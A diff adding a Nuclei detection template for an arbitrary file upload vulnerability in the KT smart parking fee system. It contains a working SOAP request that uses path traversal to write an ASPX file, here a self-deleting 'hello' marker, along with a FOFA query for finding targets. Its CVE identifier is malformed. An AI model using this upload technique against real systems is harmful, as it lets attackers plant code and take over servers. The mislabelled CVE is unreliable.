@@ -1,0 +1,60 @@
+id: 2024-105201530
+
+info:
+  name: 科拓全智能停车收费系统Webservice.asmx存在任意文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    科拓全智能停车收费系统 Webservice.asmx接口处存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%A7%91%E6%8B%93%E5%85%A8%E6%99%BA%E8%83%BD%E5%81%9C%E8%BD%A6%E6%94%B6%E8%B4%B9%E7%B3%BB%E7%BB%9FWebservice.asmx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  remediation: |
+    将科拓全智能停车收费系统升级至最新版本
+  classification:
+    cve-id: 2024-105201530
+    cvss-score: 9.5
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-05-17
+    version: 科拓全智能停车收费系统
+    fofa-query: body="/KT_Css/qd_defaul.css"
+  tags: fileupload,rce,KT,科拓全智能停车收费系统
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.aspx"
+
+
+http:
+  - raw:
+      - |-
+        POST /Webservice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+        Content-Type: text/xml
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="
+              http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+              xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+                <soap:Body>
+                  <UploadResume xmlns="http://tempuri.org/">
+                  <ip>1</ip>
+                  <fileName>../../../../{{file_name}}</fileName>
+                    <fileFlow>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT4KPCVSZXNwb25zZS5Xcml0ZSgiaGVsbG8iKTtTeXN0ZW0uSU8uRmlsZS5EZWxldGUoUmVxdWVzdC5QaHlzaWNhbFBhdGgpOyU+</fileFlow>
+                    <tag>3</tag>
+                  </UploadResume>
+                </soap:Body>
+            </soap:Envelope>
+
+      - |
+        GET /{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+  
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "hello")'
+        condition: and
